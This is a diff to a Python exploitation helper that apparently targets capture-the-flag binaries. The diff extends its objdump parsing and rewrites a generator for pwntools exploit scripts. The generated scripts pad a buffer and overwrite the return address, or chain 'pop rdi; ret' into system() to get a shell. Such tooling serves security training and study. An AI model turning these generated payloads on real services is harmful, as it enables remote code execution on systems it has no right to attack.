@@ -294,7 +294,7 @@ def dispMenu():
    print(colored(GRAD[5],colour6), end=' ')
    print('\u2551')           
 # -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- --- -- -- --- -  
-   print('\u2551' + " UNALLOCATED 1 " + '\u2551', end=' ')
+   print('\u2551' + " PUTS @ PLT    " + '\u2551', end=' ')
    if RAX[:18] == "0x0000000000000000":
       print(colored(RAX,colour7), end=' ')
    else:
@@ -1018,6 +1018,7 @@ while True:
       if FIL[:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
+         print(colored("[*] Examining filename " + localDir + "/" + FIL.rstrip(" ") + "...", colour3))
          command("objdump -D " + localDir + "/" + FIL.rstrip(" ") + " > systems.tmp")
          command("cat systems.tmp | grep system > system.tmp")
          count = lineCount("system.tmp")
@@ -1208,12 +1209,18 @@ while True:
          command("awk '/ _fini/' functions.tmp >> altered.tmp")                  
          cutLine("fini","functions.tmp")
          command("echo '- - - - - - - - - - - - - - - - - - - - - - - -' >> altered.tmp")
+         command("awk '/puts/' functions.tmp >> altered.tmp")
+         cutLine("puts","functions.tmp")
+         command("echo '- - - - - - - - - - - - - - - - - - - - - - - -' >> altered.tmp")                  
          command("cat functions.tmp >> altered.tmp")
          command("rm functions.tmp")
          command("mv altered.tmp functions.tmp")   
-         check = linecache.getline("functions.tmp", 1)
-         if check[:1] == "-":
+         check1 = linecache.getline("functions.tmp", 1)
+         if check1[:1] == "-":
             cutLine("- - - - - -", "functions.tmp")
+         check2 = linecache.getline("functions.tmp", 1)            
+         if check2[:1] == "-":
+            cutLine("- - - - - -", "functions.tmp")            
          with open("functions.tmp", "r") as functions:
             for x in range(0, maxDispl):
                FUNC[x] = functions.readline().rstrip(" ")
@@ -1224,7 +1231,14 @@ while True:
                for line in start:
                   address, checksum = line.split("  ")
                   if checksum[:6] == "_start":
-                     SRT = spacePadding(address, COL1)                     
+                     SRT = spacePadding(address, COL1)         
+         if RAX[:18] == "0x0000000000000000":
+            command("cat functions.tmp | grep 'puts' > puts.tmp ")
+            with open("puts.tmp","r") as main:
+               for line in main:
+                  address, checksum = line.split("  ")
+                  if checksum[:4] == "puts":
+                     RAX = spacePadding(address, COL1)          
          if MAN[:18] == "0x0000000000000000":
             command("cat functions.tmp | grep 'main' > main.tmp ")
             with open("main.tmp","r") as main:
@@ -1784,39 +1798,55 @@ while True:
       if FIL[:7].upper() == "UNKNOWN":
          print("[-] Filename not specified...")
       else:
-         command("echo '#!/usr/bin/python' > " + localDir + "/exploit.py")
+         command("echo '#!/usr/bin/python3' > " + localDir + "/exploit.py")
          command("echo '# coding:UTF-8' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
          command("echo '# -------------------------------------------------------------------------------------'  >> " + localDir + "/exploit.py")
-         command("echo '#                 PYTHON UTILITY SCRIPT FILE FOR BINARY EXPLOITATION' >> " + localDir + "/exploit.py")
+         command("echo '#                    PYTHON SCRIPT FILE FOR BINARY EXPLOITATION' >> " + localDir + "/exploit.py")
          command("echo '#               BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)' >> " + localDir + "/exploit.py")
          command("echo '# -------------------------------------------------------------------------------------' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
          command("echo 'from pwn import *' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
          command("echo 'context.clear()' >> " + localDir + "/exploit.py")
-         command("echo 'context.log_level = \"debug\"' >> " + localDir + "/exploit.py")
-         command("echo 'context.binary = \"./" + FIL.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")         
-         command("echo '' >> " + localDir + "/exploit.py")         
-         if COM[:3] == "ELF":
+         command("echo 'context.log_level = \"error\" #  also info or debug' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
+         if COM[:3].upper() == "ELF":
+            command("echo 'elf  = ELF(\"./" + FIL.rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
+            command("echo ' # context.binary = \"./" + FIL.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
+            command("echo '' >> " + localDir + "/exploit.py") # SPACER
+            command("echo 'rop  = ROP(elf.path)' >> " + localDir + "/exploit.py")
+            command("echo 'libc = ELF(\"" + LIB.rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
+            command("echo 'info(rop.dump())' >> " + localDir + "/exploit.py")
+         else:
+            command("echo '# elf  = ELF(\"./" + FIL.rstrip(" ") + "\")' >> " + localDir + "/exploit.py")
+            command("echo 'context.binary = \"./" + FIL.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
+         if COM[:3].upper() == "ELF":
             command("echo '#context.os = \"linux\"' >> " + localDir + "/exploit.py")
          else:
             command("echo '#context.os = \"windows\"' >> " + localDir + "/exploit.py")
          command("echo '#context.arch = \"" + ARC.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.bits = \"" + BIT[:2] + "\"' >> " + localDir + "/exploit.py")
          command("echo '#context.endian = \"" + IND.rstrip(" ") + "\"' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")
-         command("echo 'try:' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
          if RAD[:7] == "unknown":
-            command("echo '   s = remote(\"0\",0)' >> " + localDir + "/exploit.py")
+            command("echo 'ip_address = \"0\"' >> " + localDir + "/exploit.py")          
          else:
-            command("echo '   s = remote(\"" + RAD.rstrip(" ") + "\", " + POR.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'except:' >> " + localDir + "/exploit.py")
+            command("echo 'ip_address = \"" + RAD + "\"' >> " + localDir + "/exploit.py")
+         if POR[:7] == "unknown":
+            command("echo 'port = 0' >> " + localDir + "/exploit.py")         
+         else:
+            command("echo 'port = " + POR + "' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER         
+         command("echo 'if ip_address != \"0\":' >> " + localDir + "/exploit.py")
+         command("echo '   s = remote(ip_address, port)' >> " + localDir + "/exploit.py")
+         command("echo 'else:' >> " + localDir + "/exploit.py")
          command("echo '   s = process(\"./" + FIL.rstrip(" ") + "\")'  >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")        
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
          command("echo 'RAX = p64(" + RAX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RBX = p64(" + RBX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'SYS = p64(" + SYS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'SYS = p64(" + SYS.rstrip(" ") + ") # System' >> " + localDir + "/exploit.py")
          command("echo 'RDX = p64(" + RDX.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'CUS = p64(" + CUS.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RDI = p64(" + RDI.rstrip(" ") + ") # pop rdi ; ret' >> " + localDir + "/exploit.py")
@@ -1824,10 +1854,10 @@ while True:
          command("echo 'RBP = p64(" + RBP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo 'RIP = p64(" + RIP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")        
-         command("echo 'start = p64(" + SRT.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'main  = p64(" + MAN.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'jump  = p64(" + JMP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
-         command("echo 'write = p64(" + TST.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'start= p64(" + SRT.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'main = p64(" + MAN.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'jump = p64(" + JMP.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
+         command("echo 'test = p64(" + TST.rstrip(" ") + ")' >> " + localDir + "/exploit.py")
          command("echo '' >> " + localDir + "/exploit.py")
          if OF2[:1] == "0":
             command("echo 'offset = " + OFF.rstrip(" ").replace("Bytes","") + "' >> " + localDir + "/exploit.py")
@@ -1836,6 +1866,7 @@ while True:
          command("echo 'padding = \"a\" * offset' >> " + localDir + "/exploit.py")
          command("echo 'terminate = \"\\\\n\"' >> " + localDir + "/exploit.py")         
          command("echo '' >> " + localDir + "/exploit.py")         
+         switch = 0
          if JMP.rstrip(" ") != "0x0000000000000000":
             switch = 1           
          if TST.rstrip(" ") != "0x0000000000000000":
@@ -1843,15 +1874,15 @@ while True:
          if CUS.rstrip(" ") != "0x0000000000000000":
             switch = 3         
          command("echo 'switch = " + str(switch) + "' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")                    
+         command("echo '' >> " + localDir + "/exploit.py") # sPACER                    
          command("echo 'if switch == 1:' >> " + localDir + "/exploit.py")
          command("echo '   payload = flat(padding,jump,terminate)' >> " + localDir + "/exploit.py")
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
          command("echo 'if switch == 2:' >> " + localDir + "/exploit.py")
-         command("echo '   payload = flat(padding,write,terminate)' >> "  + localDir + "/exploit.py")
+         command("echo '   payload = flat(padding,test,terminate)' >> "  + localDir + "/exploit.py")
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py")         
-         command("echo '' >> " + localDir + "/exploit.py")           
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
          command("echo 'if switch == 3:' >> " + localDir + "/exploit.py")
          command("echo '   payload = flat(padding,RDI,CUS,SYS,terminate)' >> "  + localDir + "/exploit.py")
          command("echo '#   print(payload)' >> " + localDir + "/exploit.py") 
@@ -1862,9 +1893,8 @@ while True:
          command("echo '   s.recvuntil(\">>\")' >> " + localDir + "/exploit.py")
          command("echo '   s.sendline(\"flag\")' >> " + localDir + "/exploit.py")
          command("echo '   s.recvuntil(\":\")' >> " + localDir + "/exploit.py")         
-         command("echo '' >> " + localDir + "/exploit.py")
+         command("echo '' >> " + localDir + "/exploit.py") # SPACER
          command("echo 's.send(payload)' >> " + localDir + "/exploit.py")
-         command("echo '' >> " + localDir + "/exploit.py")
          command("echo 's.interactive()' >> " + localDir + "/exploit.py")
          command("echo 's.close()' >> " + localDir + "/exploit.py")
          print(colored("[*] Python exploit template sucessfully created...", colour3))
